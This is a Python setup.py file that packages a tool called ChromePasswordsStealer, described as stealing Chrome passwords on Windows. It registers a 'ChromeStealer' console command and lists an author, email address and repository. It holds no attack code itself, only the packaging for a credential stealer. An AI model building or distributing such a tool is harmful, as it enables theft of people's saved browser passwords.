from setuptools import setup, find_packages

setup(
    name = "ChromePasswordsStealer",
 
    version = "0.0.1",
    packages = find_packages(include=["ChromePasswordsStealer"]),
    install_requires = ["pywin32"],

    author = "Maurice Lambert", 
    author_email = "mauricelambert434@gmail.com",
 
    description = "This package steal chrome password on Windows.",
    long_description = open('README.md').read(),
    long_description_content_type="text/markdown",
 
    include_package_data = True,

    url = 'https://github.com/mauricelambert/ChromePasswordsStealer',
 
    classifiers = [
        "Programming Language :: Python",
        "Development Status :: 5 - Production/Stable",
        "Environment :: Console",
        "Natural Language :: English",
        "Programming Language :: Python :: 3.9",
        "Operating System :: Microsoft :: Windows",
        "Topic :: Security",
    ],
 
    entry_points = {
        'console_scripts': [
            'ChromeStealer = ChromePasswordsStealer:steal'
        ],
    },
    python_requires='>=3.6',
)